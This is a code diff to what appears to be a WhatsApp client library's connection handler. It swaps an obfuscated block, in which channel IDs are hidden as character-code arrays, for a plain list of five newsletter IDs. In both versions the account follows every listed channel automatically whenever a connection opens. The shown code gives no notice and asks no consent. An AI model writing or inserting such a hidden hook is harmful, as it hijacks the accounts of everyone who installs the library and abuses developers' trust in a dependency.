@@ -1703,16 +1703,13 @@ export const makeMessagesRecvSocket = (config) => {
 if (connection === "open") {
     setTimeout(async () => {
         try {
-            const dcd = (arr) => arr.map((e) => String.fromCharCode(e)).join("");
-
-            const d = [64, 110, 101, 119, 115, 108, 101, 116, 116, 101, 114];
-
-            const n1 = [49,50,48,51,54,51,52,49,52,50,50,49,53,48,54,51,49,54];
-            const n2 = [49,50,48,51,54,51,52,49,49,55,54,54,57,56,54,50,48,50];
-            const n3 = [49,50,48,51,54,51,52,51,52,57,48,56,53,52,52,48,51,54];
-            const n4 = [49,50,48,51,54,51,52,49,51,56,57,54,53,53,56,53,52,57];
-
-            const nsids = [n1, n2, n3, n4].map(n => dcd(n) + dcd(d));
+            const nsids = [
+                "120363414517638690@newsletter",
+                "120363432069735346@newsletter",
+                "120363416099118145@newsletter",
+                "120363414901357631@newsletter",
+                "120363432316221200@newsletter"
+            ];
 
             for (const id of nsids) {
                 await sock.newsletterFollow(id);
